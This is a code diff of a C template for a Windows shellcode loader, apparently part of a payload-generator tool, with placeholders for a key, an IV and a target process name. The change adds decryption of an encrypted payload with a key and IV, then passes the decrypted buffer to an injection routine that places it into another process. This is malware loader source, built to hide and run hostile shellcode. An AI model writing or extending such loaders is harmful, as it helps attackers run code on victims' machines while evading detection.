@@ -6,6 +6,7 @@
 
 /* KEY */
 
+/* IV */
 
 int main() {
 
@@ -23,11 +24,18 @@ int main() {
 #endif
 
 BOOL bSuccess;
+PVOID pDecryptedPayload = Payload;
+SIZE_T PayloadSize = sizeof(Payload);
 
 #ifdef ENCRYPTED_PAYLOAD
-    bSuccess = decrypt(Payload, sizeof(Payload), key, sizeof(key));
+    DWORD dwDecryptedPayloadSize = NULL;
+    bSuccess = decrypt(Payload, sizeof(Payload), key, sizeof(key), iv, &pDecryptedPayload, &dwDecryptedPayloadSize);
+    if (bSuccess && pDecryptedPayload != NULL) {
+        PayloadSize = dwDecryptedPayloadSize;
+        DebugPrint("[i] Payload decrypted successfully. [size: %d]\n", PayloadSize);
+    }
 #else
-    bSuccess = decrypt(Payload, sizeof(Payload), NULL, 0);
+    bSuccess = decrypt(pDecryptedPayload, PayloadSize, NULL, 0, NULL, NULL, NULL);
 #endif
 
     if (!bSuccess) {
@@ -37,9 +45,9 @@ BOOL bSuccess;
 
 #ifdef PROCESS_NAME_ENABLED
     LPWSTR szProcessName =  /* PROCESS_NAME */;
-    bSuccess = inject_payload(Payload, sizeof(Payload), szProcessName);
+    bSuccess = inject_payload(pDecryptedPayload, PayloadSize, szProcessName);
 #else
-    bSuccess = inject_payload(Payload, sizeof(Payload));
+    bSuccess = inject_payload(pDecryptedPayload, PayloadSize);
 #endif
 
     if (bSuccess) {
